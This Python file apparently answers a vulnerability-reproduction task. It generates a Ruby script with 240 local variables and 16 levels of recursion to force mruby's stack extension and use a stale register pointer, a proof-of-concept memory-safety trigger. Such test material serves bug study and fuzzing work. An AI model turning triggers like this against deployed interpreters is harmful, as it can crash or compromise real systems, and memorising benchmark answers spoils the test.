import os
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a Ruby script that forces mrb_stack_extend and then uses the (possibly) stale regs pointer.
        # Strategy:
        # - Define a method with many local variables to require a large number of VM registers (nregs).
        # - Recursively call the method multiple times to ensure stack growth regardless of initial stack size.
        # This should trigger the bug in vulnerable versions, but run fine in fixed versions.

        # Number of locals below the typical maximum register limit in mruby (<= 255).
        locals_count = 240  # large enough to require substantial registers
        # Depth ensures stack extension even if initial stack size is larger (e.g., 256 or more).
        depth = 16

        def chunked_assignments(var_count: int, per_line: int = 20) -> List[str]:
            assigns = [f"v{i}=nil" for i in range(var_count)]
            lines = []
            for i in range(0, len(assigns), per_line):
                lines.append("; ".join(assigns[i:i + per_line]) + ";")
            return lines

        lines = []
        lines.append("def deep(n)")
        lines.extend(chunked_assignments(locals_count))
        lines.append("if n > 0")
        lines.append("  deep(n - 1)")
        lines.append("end")
        lines.append("end")
        lines.append(f"deep({depth})")
        code = "\n".join(lines) + "\n"
        return code.encode("utf-8")